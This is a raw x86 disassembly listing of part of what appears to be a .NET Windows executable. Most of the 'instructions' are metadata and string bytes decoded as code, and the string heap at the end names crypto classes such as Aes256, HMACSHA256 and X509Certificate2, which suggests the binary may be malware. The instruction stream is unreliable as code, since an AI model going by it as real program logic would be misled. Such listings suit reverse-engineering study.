  40536b:	03 3b                	add    (%ebx),%edi
  40536d:	06                   	push   %es
  40536e:	d4 02                	aam    $0x2
  405370:	79 01                	jns    0x405373
  405372:	4d                   	dec    %ebp
  405373:	06                   	push   %es
  405374:	d4 02                	aam    $0x2
  405376:	79 01                	jns    0x405379
  405378:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  405379:	0a 06                	or     (%esi),%al
  40537b:	01 b1 03 89 16 da    	add    %esi,-0x25e976fd(%ecx)
  405381:	02 b9 03 e3 11 e0    	add    -0x1fee1cfd(%ecx),%bh
  405387:	02 b9 03 17 05 e7    	add    -0x18fae8fd(%ecx),%bh
  40538d:	02 a9 02 c5 06 06    	add    0x606c502(%ecx),%ch
  405393:	00 b1 00 c5 06 06    	add    %dh,0x606c500(%ecx)
  405399:	00 49 01             	add    %cl,0x1(%ecx)
  40539c:	e3 11                	jecxz  0x4053af
  40539e:	c1 00 0c             	roll   $0xc,(%eax)
  4053a1:	00 e3                	add    %ah,%bl
  4053a3:	11 06                	adc    %eax,(%esi)
  4053a5:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053a8:	5c                   	pop    %esp
  4053a9:	02 09                	add    (%ecx),%cl
  4053ab:	03 0c 00             	add    (%eax,%eax,1),%ecx
  4053ae:	d4 16                	aam    $0x16
  4053b0:	82 02 0c             	addb   $0xc,(%edx)
  4053b3:	00 c6                	add    %al,%dh
  4053b5:	17                   	pop    %ss
  4053b6:	0f 03 59 02          	lsl    0x2(%ecx),%ebx
  4053ba:	59                   	pop    %ecx
  4053bb:	0e                   	push   %cs
  4053bc:	15 03 89 01 4b       	adc    $0x4b018903,%eax
  4053c1:	14 2f                	adc    $0x2f,%al
  4053c3:	03 89 01 5d 01 36    	add    0x36015d01(%ecx),%ecx
  4053c9:	03 91 01 a5 02 36    	add    0x3602a501(%ecx),%edx
  4053cf:	03 c9                	add    %ecx,%ecx
  4053d1:	03 93 18 3c 03 71    	add    0x71033c18(%ebx),%edx
  4053d7:	01 e3                	add    %esp,%ebx
  4053d9:	11 01                	adc    %eax,(%ecx)
  4053db:	00 99 01 e3 11 52    	add    %bl,0x5211e301(%ecx)
  4053e1:	03 d1                	add    %ecx,%edx
  4053e3:	03 c5                	add    %ebp,%eax
  4053e5:	06                   	push   %es
  4053e6:	06                   	push   %es
  4053e7:	00 d9                	add    %bl,%cl
  4053e9:	03 e3                	add    %ebx,%esp
  4053eb:	11 ef                	adc    %ebp,%edi
  4053ed:	00 e1                	add    %ah,%cl
  4053ef:	03 0e                	add    (%esi),%ecx
  4053f1:	0a 5a 03             	or     0x3(%edx),%bl
  4053f4:	29 01                	sub    %eax,(%ecx)
  4053f6:	2d 04 c3 01 39       	sub    $0x3901c304,%eax
  4053fb:	01 de                	add    %ebx,%esi
  4053fd:	17                   	pop    %ss
  4053fe:	1f                   	pop    %ds
  4053ff:	02 39                	add    (%ecx),%bh
  405401:	01 1b                	add    %ebx,(%ebx)
  405403:	09 6a 03             	or     %ebp,0x3(%edx)
  405406:	39 01                	cmp    %eax,(%ecx)
  405408:	de 17                	ficoms (%edi)
  40540a:	7e 03                	jle    0x40540f
  40540c:	39 01                	cmp    %eax,(%ecx)
  40540e:	12 09                	adc    (%ecx),%cl
  405410:	73 02                	jae    0x405414
  405412:	39 01                	cmp    %eax,(%ecx)
  405414:	06                   	push   %es
  405415:	09 10                	or     %edx,(%eax)
  405417:	00 39                	add    %bh,(%ecx)
  405419:	01 f8                	add    %edi,%eax
  40541b:	17                   	pop    %ss
  40541c:	88 03                	mov    %al,(%ebx)
  40541e:	39 01                	cmp    %eax,(%ecx)
  405420:	63 04 10             	arpl   %eax,(%eax,%edx,1)
  405423:	00 11                	add    %dl,(%ecx)
  405425:	01 40 13             	add    %eax,0x13(%eax)
  405428:	9a 01 11 01 ad 0a 06 	lcall  $0x60a,$0xad011101
  40542f:	01 11                	add    %edx,(%ecx)
  405431:	01 c7                	add    %eax,%edi
  405433:	0a 10                	or     (%eax),%dl
  405435:	00 11                	add    %dl,(%ecx)
  405437:	01 e8                	add    %ebp,%eax
  405439:	10 a0 01 1c 00 5c    	adc    %ah,0x5c001c01(%eax)
  40543f:	02 09                	add    (%ecx),%cl
  405441:	03 11                	add    (%ecx),%edx
  405443:	01 50 13             	add    %edx,0x13(%eax)
  405446:	be 01 f1 03 3d       	mov    $0x3d03f101,%esi
  40544b:	17                   	pop    %ss
  40544c:	b8 03 1c 00 cb       	mov    $0xcb001c03,%eax
  405451:	11 d0                	adc    %edx,%eax
  405453:	03 24 00             	add    (%eax,%eax,1),%esp
  405456:	7d 16                	jge    0x40546e
  405458:	e3 03                	jecxz  0x40545d
  40545a:	1c 00                	sbb    $0x0,%al
  40545c:	46                   	inc    %esi
  40545d:	09 e8                	or     %ebp,%eax
  40545f:	03 24 00             	add    (%eax,%eax,1),%esp
  405462:	4a                   	dec    %edx
  405463:	17                   	pop    %ss
  405464:	b7 00                	mov    $0x0,%bh
  405466:	01 04 36             	add    %eax,(%esi,%esi,1)
  405469:	0e                   	push   %cs
  40546a:	f8                   	clc
  40546b:	03 09                	add    (%ecx),%ecx
  40546d:	04 b0                	add    $0xb0,%al
  40546f:	14 fe                	adc    $0xfe,%al
  405471:	03 01                	add    (%ecx),%eax
  405473:	04 57                	add    $0x57,%al
  405475:	02 05 04 b9 01 96    	add    0x9601b904,%al
  40547b:	06                   	push   %es
  40547c:	0d 04 11 04 00       	or     $0x41104,%eax
  405481:	04 14                	add    $0x14,%al
  405483:	04 c1                	add    $0xc1,%al
  405485:	01 ee                	add    %ebp,%esi
  405487:	04 1b                	add    $0x1b,%al
  405489:	04 21                	add    $0x21,%al
  40548b:	04 14                	add    $0x14,%al
  40548d:	07                   	pop    %es
  40548e:	24 04                	and    $0x4,%al
  405490:	31 04 15 10 2e 04 2c 	xor    %eax,0x2c042e10(,%edx,1)
  405497:	00 14 07             	add    %dl,(%edi,%eax,1)
  40549a:	67 04 2c             	addr16 add $0x2c,%al
  40549d:	00 72 15             	add    %dh,0x15(%edx)
  4054a0:	74 04                	je     0x4054a6
  4054a2:	34 00                	xor    $0x0,%al
  4054a4:	90                   	nop
  4054a5:	04 8f                	add    $0x8f,%al
  4054a7:	04 1c                	add    $0x1c,%al
  4054a9:	00 e3                	add    %ah,%bl
  4054ab:	11 06                	adc    %eax,(%esi)
  4054ad:	00 59 02             	add    %bl,0x2(%ecx)
  4054b0:	d1 18                	rcrl   $1,(%eax)
  4054b2:	36 00 49 04          	add    %cl,%ss:0x4(%ecx)
  4054b6:	e3 11                	jecxz  0x4054c9
  4054b8:	10 00                	adc    %al,(%eax)
  4054ba:	e1 01                	loope  0x4054bd
  4054bc:	e3 11                	jecxz  0x4054cf
  4054be:	b4 04                	mov    $0x4,%ah
  4054c0:	51                   	push   %ecx
  4054c1:	04 5b                	add    $0x5b,%al
  4054c3:	13 bc 04 11 02 86 0a 	adc    0xa860211(%esp,%eax,1),%edi
  4054ca:	c2 04 59             	ret    $0x5904
  4054cd:	04 e3                	add    $0xe3,%al
  4054cf:	11 10                	adc    %edx,(%eax)
  4054d1:	00 09                	add    %cl,(%ecx)
  4054d3:	01 e3                	add    %esp,%ebx
  4054d5:	11 06                	adc    %eax,(%esi)
  4054d7:	00 e9                	add    %ch,%cl
  4054d9:	01 e3                	add    %esp,%ebx
  4054db:	11 06                	adc    %eax,(%esi)
  4054dd:	00 61 04             	add    %ah,0x4(%ecx)
  4054e0:	bc 09 01 00 61       	mov    $0x61000109,%esp
  4054e5:	04 59                	add    $0x59,%al
  4054e7:	09 01                	or     %eax,(%ecx)
  4054e9:	00 61 04             	add    %ah,0x4(%ecx)
  4054ec:	0f 04                	(bad)
  4054ee:	dc 04 61             	faddl  (%ecx,%eiz,2)
  4054f1:	04 02                	add    $0x2,%al
  4054f3:	0a e3                	or     %bl,%ah
  4054f5:	04 61                	add    $0x61,%al
  4054f7:	04 d6                	add    $0xd6,%al
  4054f9:	17                   	pop    %ss
  4054fa:	9a 01 61 04 bc 01 06 	lcall  $0x601,$0xbc046101
  405501:	00 61 04             	add    %ah,0x4(%ecx)
  405504:	08 12                	or     %dl,(%edx)
  405506:	ea 04 f1 01 e3 11 f0 	ljmp   $0xf011,$0xe301f104
  40550d:	04 61                	add    $0x61,%al
  40550f:	04 ae                	add    $0xae,%al
  405511:	01 be 01 f1 01 4d    	add    %edi,0x4d01f101(%esi)
  405517:	0c 06                	or     $0x6,%al
  405519:	00 f9                	add    %bh,%cl
  40551b:	01 e3                	add    %esp,%ebx
  40551d:	11 9a 01 09 01 c6    	adc    %ebx,-0x39fef6ff(%edx)
  405523:	17                   	pop    %ss
  405524:	be 01 99 03 32       	mov    $0x32039901,%esi
  405529:	0b fd                	or     %ebp,%edi
  40552b:	04 31                	add    $0x31,%al
  40552d:	02 d3                	add    %bl,%dl
  40552f:	0a 06                	or     (%esi),%al
  405531:	05 89 04 e3 11       	add    $0x11e30489,%eax
  405536:	10 00                	adc    %al,(%eax)
  405538:	61                   	popa
  405539:	04 b5                	add    $0xb5,%al
  40553b:	01 9a 01 61 04 f8    	add    %ebx,-0x7fb9eff(%edx)
  405541:	11 ea                	adc    %ebp,%edx
  405543:	04 a9                	add    $0xa9,%al
  405545:	02 91 0b 41 02 91    	add    -0x6efdbef5(%ecx),%dl
  40554b:	04 69                	add    $0x69,%al
  40554d:	18 29                	sbb    %ch,(%ecx)
  40554f:	05 a1 04 b6 17       	add    $0x17b604a1,%eax
  405554:	3e 05 01 02 e3 11    	ds add $0x11e30201,%eax
  40555a:	06                   	push   %es
  40555b:	00 08                	add    %cl,(%eax)
  40555d:	00 88 00 72 05 08    	add    %cl,0x8057200(%eax)
  405563:	00 8c 00 77 05 08 00 	add    %cl,0x80577(%eax,%eax,1)
  40556a:	90                   	nop
  40556b:	00 7c 05 08          	add    %bh,0x8(%ebp,%eax,1)
  40556f:	00 94 00 72 05 09 00 	add    %dl,0x90572(%eax,%eax,1)
  405576:	ac                   	lods   %ds:(%esi),%al
  405577:	00 81 05 09 00 b0    	add    %al,-0x4ffff6fb(%ecx)
  40557d:	00 86 05 09 00 b4    	add    %al,-0x4bfff6fb(%esi)
  405583:	00 8b 05 2e 00 0b    	add    %cl,0xb002e05(%ebx)
  405589:	00 ac 06 2e 00 13 00 	add    %ch,0x13002e(%esi,%eax,1)
  405590:	b5 06                	mov    $0x6,%ch
  405592:	2e 00 1b             	add    %bl,%cs:(%ebx)
  405595:	00 d4                	add    %dl,%ah
  405597:	06                   	push   %es
  405598:	2e 00 23             	add    %ah,%cs:(%ebx)
  40559b:	00 dd                	add    %bl,%ch
  40559d:	06                   	push   %es
  40559e:	2e 00 2b             	add    %ch,%cs:(%ebx)
  4055a1:	00 dd                	add    %bl,%ch
  4055a3:	06                   	push   %es
  4055a4:	2e 00 33             	add    %dh,%cs:(%ebx)
  4055a7:	00 dd                	add    %bl,%ch
  4055a9:	06                   	push   %es
  4055aa:	2e 00 3b             	add    %bh,%cs:(%ebx)
  4055ad:	00 dd                	add    %bl,%ch
  4055af:	06                   	push   %es
  4055b0:	2e 00 43 00          	add    %al,%cs:0x0(%ebx)
  4055b4:	dd 06                	fldl   (%esi)
  4055b6:	2e 00 4b 00          	add    %cl,%cs:0x0(%ebx)
  4055ba:	dd 06                	fldl   (%esi)
  4055bc:	2e 00 53 00          	add    %dl,%cs:0x0(%ebx)
  4055c0:	dd 06                	fldl   (%esi)
  4055c2:	2e 00 5b 00          	add    %bl,%cs:0x0(%ebx)
  4055c6:	dd 06                	fldl   (%esi)
  4055c8:	2e 00 63 00          	add    %ah,%cs:0x0(%ebx)
  4055cc:	e3 06                	jecxz  0x4055d4
  4055ce:	2e 00 6b 00          	add    %ch,%cs:0x0(%ebx)
  4055d2:	f0 06                	lock push %es
  4055d4:	c0 00 73             	rolb   $0x73,(%eax)
  4055d7:	00 8b 05 e0 00 73    	add    %cl,0x7300e005(%ebx)
  4055dd:	00 8b 05 00 01 73    	add    %cl,0x73010005(%ebx)
  4055e3:	00 8b 05 20 01 73    	add    %cl,0x73012005(%ebx)
  4055e9:	00 8b 05 40 01 73    	add    %cl,0x73014005(%ebx)
  4055ef:	00 8b 05 60 01 73    	add    %cl,0x73016005(%ebx)
  4055f5:	00 8b 05 80 01 73    	add    %cl,0x73018005(%ebx)
  4055fb:	00 8b 05 a0 01 73    	add    %cl,0x7301a005(%ebx)
  405601:	00 8b 05 c0 01 73    	add    %cl,0x7301c005(%ebx)
  405607:	00 8b 05 e0 01 73    	add    %cl,0x7301e005(%ebx)
  40560d:	00 8b 05 00 02 73    	add    %cl,0x73020005(%ebx)
  405613:	00 8b 05 20 02 73    	add    %cl,0x73022005(%ebx)
  405619:	00 8b 05 23 02 73    	add    %cl,0x73022305(%ebx)
  40561f:	00 8b 05 40 02 73    	add    %cl,0x73024005(%ebx)
  405625:	00 8b 05 60 02 73    	add    %cl,0x73026005(%ebx)
  40562b:	00 8b 05 61 02 73    	add    %cl,0x73026105(%ebx)
  405631:	00 8b 05 61 02 7b    	add    %cl,0x7b026105(%ebx)
  405637:	00 3a                	add    %bh,(%edx)
  405639:	07                   	pop    %es
  40563a:	63 02                	arpl   %eax,(%edx)
  40563c:	73 00                	jae    0x40563e
  40563e:	8b 05 80 02 73 00    	mov    0x730280,%eax
  405644:	8b 05 81 02 73 00    	mov    0x730281,%eax
  40564a:	8b 05 81 02 7b 00    	mov    0x7b0281,%eax
  405650:	3a 07                	cmp    (%edi),%al
  405652:	a0 02 73 00 8b       	mov    0x8b007302,%al
  405657:	05 a1 02 73 00       	add    $0x7302a1,%eax
  40565c:	8b 05 a1 02 7b 00    	mov    0x7b02a1,%eax
  405662:	3a 07                	cmp    (%edi),%al
  405664:	c0 02 73             	rolb   $0x73,(%edx)
  405667:	00 8b 05 c1 02 73    	add    %cl,0x7302c105(%ebx)
  40566d:	00 8b 05 c1 02 7b    	add    %cl,0x7b02c105(%ebx)
  405673:	00 3a                	add    %bh,(%edx)
  405675:	07                   	pop    %es
  405676:	e0 02                	loopne 0x40567a
  405678:	73 00                	jae    0x40567a
  40567a:	8b 05 e1 02 73 00    	mov    0x7302e1,%eax
  405680:	8b 05 e1 02 7b 00    	mov    0x7b02e1,%eax
  405686:	3a 07                	cmp    (%edi),%al
  405688:	00 03                	add    %al,(%ebx)
  40568a:	73 00                	jae    0x40568c
  40568c:	8b 05 01 03 73 00    	mov    0x730301,%eax
  405692:	8b 05 01 03 7b 00    	mov    0x7b0301,%eax
  405698:	3a 07                	cmp    (%edi),%al
  40569a:	20 03                	and    %al,(%ebx)
  40569c:	73 00                	jae    0x40569e
  40569e:	8b 05 21 03 73 00    	mov    0x730321,%eax
  4056a4:	8b 05 21 03 7b 00    	mov    0x7b0321,%eax
  4056aa:	3a 07                	cmp    (%edi),%al
  4056ac:	40                   	inc    %eax
  4056ad:	03 73 00             	add    0x0(%ebx),%esi
  4056b0:	8b 05 41 03 73 00    	mov    0x730341,%eax
  4056b6:	8b 05 41 03 7b 00    	mov    0x7b0341,%eax
  4056bc:	3a 07                	cmp    (%edi),%al
  4056be:	61                   	popa
  4056bf:	03 73 00             	add    0x0(%ebx),%esi
  4056c2:	8b 05 61 03 7b 00    	mov    0x7b0361,%eax
  4056c8:	3a 07                	cmp    (%edi),%al
  4056ca:	81 03 73 00 8b 05    	addl   $0x58b0073,(%ebx)
  4056d0:	81 03 7b 00 3a 07    	addl   $0x73a007b,(%ebx)
  4056d6:	a1 03 73 00 8b       	mov    0x8b007303,%eax
  4056db:	05 a1 03 7b 00       	add    $0x7b03a1,%eax
  4056e0:	3a 07                	cmp    (%edi),%al
  4056e2:	01 00                	add    %eax,(%eax)
  4056e4:	20 00                	and    %al,(%eax)
  4056e6:	00 00                	add    %al,(%eax)
  4056e8:	14 00                	adc    $0x0,%al
  4056ea:	20 00                	and    %al,(%eax)
  4056ec:	3b 00                	cmp    (%eax),%eax
  4056ee:	3f                   	aas
  4056ef:	00 71 00             	add    %dh,0x0(%ecx)
  4056f2:	34 01                	xor    $0x1,%al
  4056f4:	6d                   	insl   (%dx),%es:(%edi)
  4056f5:	01 aa 01 c7 01 3b    	add    %ebp,0x3b01c701(%edx)
  4056fb:	02 45 02             	add    0x2(%ebp),%al
  4056fe:	4f                   	dec    %edi
  4056ff:	02 7c 02 86          	add    -0x7a(%edx,%eax,1),%bh
  405703:	02 9a 02 be 02 ee    	add    -0x11fd41fe(%edx),%bl
  405709:	02 1c 03             	add    (%ebx,%eax,1),%bl
  40570c:	46                   	inc    %esi
  40570d:	03 4f 03             	add    0x3(%edi),%ecx
  405710:	61                   	popa
  405711:	03 73 03             	add    0x3(%ebx),%esi
  405714:	90                   	nop
  405715:	03 ee                	add    %esi,%ebp
  405717:	03 a7 04 ad 04 c8    	add    -0x37fb52fc(%edi),%esp
  40571d:	04 0c                	add    $0xc,%al
  40571f:	05 36 05 48 05       	add    $0x5480536,%eax
  405724:	58                   	pop    %eax
  405725:	05 04 00 01 00       	add    $0x10004,%eax
  40572a:	00 00                	add    %al,(%eax)
  40572c:	40                   	inc    %eax
  40572d:	16                   	push   %ss
  40572e:	88 06                	mov    %al,(%esi)
  405730:	00 00                	add    %al,(%eax)
  405732:	24 16                	and    $0x16,%al
  405734:	8d 06                	lea    (%esi),%eax
  405736:	00 00                	add    %al,(%eax)
  405738:	e1 10                	loope  0x40574a
  40573a:	92                   	xchg   %eax,%edx
  40573b:	06                   	push   %es
  40573c:	00 00                	add    %al,(%eax)
  40573e:	88 09                	mov    %cl,(%ecx)
  405740:	97                   	xchg   %eax,%edi
  405741:	06                   	push   %es
  405742:	00 00                	add    %al,(%eax)
  405744:	ba 15 97 06 00       	mov    $0x69715,%edx
  405749:	00 3c 09             	add    %bh,(%ecx,%ecx,1)
  40574c:	9b                   	fwait
  40574d:	06                   	push   %es
  40574e:	00 00                	add    %al,(%eax)
  405750:	90                   	nop
  405751:	02 a0 06 00 00 35    	add    0x35000006(%eax),%ah
  405757:	02 a4 06 00 00 ec 09 	add    0x9ec0000(%esi,%eax,1),%ah
  40575e:	9b                   	fwait
  40575f:	06                   	push   %es
  405760:	00 00                	add    %al,(%eax)
  405762:	e8 0c a8 06 00       	call   0x46ff73
  405767:	00 0b                	add    %cl,(%ebx)
  405769:	0b a0 06 02 00 06    	or     0x6000206(%eax),%esp
  40576f:	00 03                	add    %al,(%ebx)
  405771:	00 01                	add    %al,(%ecx)
  405773:	00 07                	add    %al,(%edi)
  405775:	00 03                	add    %al,(%ebx)
  405777:	00 02                	add    %al,(%edx)
  405779:	00 08                	add    %cl,(%eax)
  40577b:	00 05 00 01 00 09    	add    %al,0x9000100
  405781:	00 05 00 02 00 0a    	add    %al,0xa000200
  405787:	00 07                	add    %al,(%edi)
  405789:	00 01                	add    %al,(%ecx)
  40578b:	00 0b                	add    %cl,(%ebx)
  40578d:	00 07                	add    %al,(%edi)
  40578f:	00 02                	add    %al,(%edx)
  405791:	00 0c 00             	add    %cl,(%eax,%eax,1)
  405794:	09 00                	or     %eax,(%eax)
  405796:	01 00                	add    %eax,(%eax)
  405798:	0d 00 09 00 02       	or     $0x2000900,%eax
  40579d:	00 0e                	add    %cl,(%esi)
  40579f:	00 0b                	add    %cl,(%ebx)
  4057a1:	00 01                	add    %al,(%ecx)
  4057a3:	00 0f                	add    %cl,(%edi)
  4057a5:	00 0b                	add    %cl,(%ebx)
  4057a7:	00 02                	add    %al,(%edx)
  4057a9:	00 10                	add    %dl,(%eax)
  4057ab:	00 0d 00 01 00 11    	add    %cl,0x11000100
  4057b1:	00 0d 00 02 00 12    	add    %cl,0x12000200
  4057b7:	00 0f                	add    %cl,(%edi)
  4057b9:	00 01                	add    %al,(%ecx)
  4057bb:	00 13                	add    %dl,(%ebx)
  4057bd:	00 0f                	add    %cl,(%edi)
  4057bf:	00 02                	add    %al,(%edx)
  4057c1:	00 14 00             	add    %dl,(%eax,%eax,1)
  4057c4:	11 00                	adc    %eax,(%eax)
  4057c6:	02 00                	add    (%eax),%al
  4057c8:	15 00 13 00 01       	adc    $0x1001300,%eax
  4057cd:	00 16                	add    %dl,(%esi)
  4057cf:	00 13                	add    %dl,(%ebx)
  4057d1:	00 02                	add    %al,(%edx)
  4057d3:	00 17                	add    %dl,(%edi)
  4057d5:	00 15 00 01 00 18    	add    %dl,0x18000100
  4057db:	00 15 00 02 00 19    	add    %dl,0x19000200
  4057e1:	00 17                	add    %dl,(%edi)
  4057e3:	00 01                	add    %al,(%ecx)
  4057e5:	00 1a                	add    %bl,(%edx)
  4057e7:	00 17                	add    %dl,(%edi)
  4057e9:	00 0d 0d 00 0d 18    	add    %cl,0x180d000d
  4057ef:	0d 02 03 85 03       	or     $0x3850302,%eax
  4057f4:	af                   	scas   %es:(%edi),%eax
  4057f5:	03 da                	add    %edx,%ebx
  4057f7:	03 4b 04             	add    0x4(%ebx),%ecx
  4057fa:	78 04                	js     0x405800
  4057fc:	00 01                	add    %al,(%ecx)
  4057fe:	73 00                	jae    0x405800
  405800:	72 17                	jb     0x405819
  405802:	01 00                	add    %eax,(%eax)
  405804:	00 01                	add    %al,(%ecx)
  405806:	75 00                	jne    0x405808
  405808:	5f                   	pop    %edi
  405809:	17                   	pop    %ss
  40580a:	01 00                	add    %eax,(%eax)
  40580c:	00 01                	add    %al,(%ecx)
  40580e:	77 00                	ja     0x405810
  405810:	cc                   	int3
  405811:	04 02                	add    $0x2,%al
  405813:	00 41 01             	add    %al,0x1(%ecx)
  405816:	79 00                	jns    0x405818
  405818:	94                   	xchg   %eax,%esp
  405819:	16                   	push   %ss
  40581a:	02 00                	add    (%eax),%al
  40581c:	40                   	inc    %eax
  40581d:	01 7b 00             	add    %edi,0x0(%ebx)
  405820:	32 07                	xor    (%edi),%al
  405822:	02 00                	add    (%eax),%al
  405824:	40                   	inc    %eax
  405825:	01 7d 00             	add    %edi,0x0(%ebp)
  405828:	69 0c 03 00 38 82 00 	imul   $0x823800,(%ebx,%eax,1),%ecx
  40582f:	00 29                	add    %ch,(%ecx)
  405831:	00 04 80             	add    %al,(%eax,%eax,4)
  405834:	00 00                	add    %al,(%eax)
  405836:	01 00                	add    %eax,(%eax)
	...
  405844:	8e 01                	mov    (%ecx),%es
  405846:	00 00                	add    %al,(%eax)
  405848:	04 00                	add    $0x0,%al
	...
  405852:	00 00                	add    %al,(%eax)
  405854:	60                   	pusha
  405855:	05 f7 01 00 00       	add    $0x1f7,%eax
  40585a:	00 00                	add    %al,(%eax)
  40585c:	04 00                	add    $0x0,%al
	...
  405866:	00 00                	add    %al,(%eax)
  405868:	60                   	pusha
  405869:	05 9b 0d 00 00       	add    $0xd9b,%eax
  40586e:	00 00                	add    %al,(%eax)
  405870:	01 00                	add    %eax,(%eax)
	...
  40587e:	e8 01 00 00 00       	call   0x405884
  405883:	00 04 00             	add    %al,(%eax,%eax,1)
	...
  40588e:	00 00                	add    %al,(%eax)
  405890:	69 05 5f 16 00 00 00 	imul   $0x40000,0x165f,%eax
  405897:	00 04 00 
	...
  4058a2:	00 00                	add    %al,(%eax)
  4058a4:	69 05 e7 0a 00 00 00 	imul   $0x40000,0xae7,%eax
  4058ab:	00 04 00 
	...
  4058b6:	00 00                	add    %al,(%eax)
  4058b8:	60                   	pusha
  4058b9:	05 a9 06 00 00       	add    $0x6a9,%eax
  4058be:	00 00                	add    %al,(%eax)
  4058c0:	0a 00                	or     (%eax),%al
	...
  4058ca:	00 00                	add    %al,(%eax)
  4058cc:	69 05 1b 02 00 00 00 	imul   $0x40000,0x21b,%eax
  4058d3:	00 04 00 
	...
  4058de:	00 00                	add    %al,(%eax)
  4058e0:	60                   	pusha
  4058e1:	05 16 14 00 00       	add    $0x1416,%eax
  4058e6:	00 00                	add    %al,(%eax)
  4058e8:	04 00                	add    $0x0,%al
	...
  4058f2:	00 00                	add    %al,(%eax)
  4058f4:	69 05 df 0f 00 00 00 	imul   $0x120000,0xfdf,%eax
  4058fb:	00 12 00 
  4058fe:	0b 00                	or     (%eax),%eax
  405900:	13 00                	adc    (%eax),%eax
  405902:	0e                   	push   %cs
  405903:	00 14 00             	add    %dl,(%eax,%eax,1)
  405906:	11 00                	adc    %eax,(%eax)
  405908:	7f 01                	jg     0x40590b
  40590a:	ca 03 00             	lret   $0x3
  40590d:	00 00                	add    %al,(%eax)
  40590f:	00 00                	add    %al,(%eax)
  405911:	41                   	inc    %ecx
  405912:	63 74 69 6f          	arpl   %esi,0x6f(%ecx,%ebp,2)
  405916:	6e                   	outsb  %ds:(%esi),(%dx)
  405917:	60                   	pusha
  405918:	31 30                	xor    %esi,(%eax)
  40591a:	00 3c 3e             	add    %bh,(%esi,%edi,1)
  40591d:	70 5f                	jo     0x40597e
  40591f:	5f                   	pop    %edi
  405920:	30 00                	xor    %al,(%eax)
  405922:	49                   	dec    %ecx
  405923:	45                   	inc    %ebp
  405924:	6e                   	outsb  %ds:(%esi),(%dx)
  405925:	75 6d                	jne    0x405994
  405927:	65 72 61             	gs jb  0x40598b
  40592a:	62 6c 65 60          	bound  %ebp,0x60(%ebp,%eiz,2)
  40592e:	31 00                	xor    %eax,(%eax)
  405930:	43                   	inc    %ebx
  405931:	61                   	popa
  405932:	6c                   	insb   (%dx),%es:(%edi)
  405933:	6c                   	insb   (%dx),%es:(%edi)
  405934:	53                   	push   %ebx
  405935:	69 74 65 60 31 00 4c 	imul   $0x694c0031,0x60(%ebp,%eiz,2),%esi
  40593c:	69 
  40593d:	73 74                	jae    0x4059b3
  40593f:	60                   	pusha
  405940:	31 00                	xor    %eax,(%eax)
  405942:	61                   	popa
  405943:	31 00                	xor    %eax,(%eax)
  405945:	76 31                	jbe    0x405978
  405947:	00 5f 5f             	add    %bl,0x5f(%edi)
  40594a:	53                   	push   %ebx
  40594b:	74 61                	je     0x4059ae
  40594d:	74 69                	je     0x4059b8
  40594f:	63 41 72             	arpl   %eax,0x72(%ecx)
  405952:	72 61                	jb     0x4059b5
  405954:	79 49                	jns    0x40599f
  405956:	6e                   	outsb  %ds:(%esi),(%dx)
  405957:	69 74 54 79 70 65 53 	imul   $0x69536570,0x79(%esp,%edx,2),%esi
  40595e:	69 
  40595f:	7a 65                	jp     0x4059c6
  405961:	3d 33 32 00 4d       	cmp    $0x4d003233,%eax
  405966:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  40596d:	74 2e                	je     0x40599d
  40596f:	57                   	push   %edi
  405970:	69 6e 33 32 00 54 6f 	imul   $0x6f540032,0x33(%esi),%ebp
  405977:	49                   	dec    %ecx
  405978:	6e                   	outsb  %ds:(%esi),(%dx)
  405979:	74 33                	je     0x4059ae
  40597b:	32 00                	xor    (%eax),%al
  40597d:	3c 3e                	cmp    $0x3e,%al
  40597f:	6f                   	outsl  %ds:(%esi),(%dx)
  405980:	5f                   	pop    %edi
  405981:	5f                   	pop    %edi
  405982:	32 00                	xor    (%eax),%al
  405984:	61                   	popa
  405985:	32 00                	xor    (%eax),%al
  405987:	58                   	pop    %eax
  405988:	35 30 39 43 65       	xor    $0x65433930,%eax
  40598d:	72 74                	jb     0x405a03
  40598f:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  405996:	32 00                	xor    (%eax),%al
  405998:	76 32                	jbe    0x4059cc
  40599a:	00 76 33             	add    %dh,0x33(%esi)
  40599d:	00 49 6e             	add    %cl,0x6e(%ecx)
  4059a0:	74 36                	je     0x4059d8
  4059a2:	34 00                	xor    $0x0,%al
  4059a4:	48                   	dec    %eax
  4059a5:	4d                   	dec    %ebp
  4059a6:	41                   	inc    %ecx
  4059a7:	43                   	inc    %ebx
  4059a8:	53                   	push   %ebx
  4059a9:	48                   	dec    %eax
  4059aa:	41                   	inc    %ecx
  4059ab:	32 35 36 00 53 68    	xor    0x68530036,%dh
  4059b1:	61                   	popa
  4059b2:	32 35 36 00 41 65    	xor    0x65410036,%dh
  4059b8:	73 32                	jae    0x4059ec
  4059ba:	35 36 00 61 65       	xor    $0x65610036,%eax
  4059bf:	73 32                	jae    0x4059f3
  4059c1:	35 36 00 67 65       	xor    $0x65670036,%eax
  4059c6:	74 5f                	je     0x405a27
  4059c8:	55                   	push   %ebp
  4059c9:	54                   	push   %esp
  4059ca:	46                   	inc    %esi
  4059cb:	38 00                	cmp    %al,(%eax)
  4059cd:	3c 4d                	cmp    $0x4d,%al
  4059cf:	6f                   	outsl  %ds:(%esi),(%dx)
  4059d0:	64 75 6c             	fs jne 0x405a3f
  4059d3:	65 3e 00 3c 50       	gs add %bh,%ds:(%eax,%edx,2)
  4059d8:	72 69                	jb     0x405a43
  4059da:	76 61                	jbe    0x405a3d
  4059dc:	74 65                	je     0x405a43
  4059de:	49                   	dec    %ecx
  4059df:	6d                   	insl   (%dx),%es:(%edi)
  4059e0:	70 6c                	jo     0x405a4e
  4059e2:	65 6d                	gs insl (%dx),%es:(%edi)
  4059e4:	65 6e                	outsb  %gs:(%esi),(%dx)
  4059e6:	74 61                	je     0x405a49
  4059e8:	74 69                	je     0x405a53
  4059ea:	6f                   	outsl  %ds:(%esi),(%dx)
  4059eb:	6e                   	outsb  %ds:(%esi),(%dx)
  4059ec:	44                   	inc    %esp
  4059ed:	65 74 61             	gs je  0x405a51
  4059f0:	69 6c 73 3e 00 31 44 	imul   $0x42443100,0x3e(%ebx,%esi,2),%ebp
  4059f7:	42 
  4059f8:	32 41 31             	xor    0x31(%ecx),%al
  4059fb:	46                   	inc    %esi
  4059fc:	39 39                	cmp    %edi,(%ecx)
  4059fe:	30 32                	xor    %dh,(%edx)
  405a00:	42                   	inc    %edx
  405a01:	33 35 46 38 46 38    	xor    0x38463846,%esi
  405a07:	38 30                	cmp    %dh,(%eax)
  405a09:	45                   	inc    %ebp
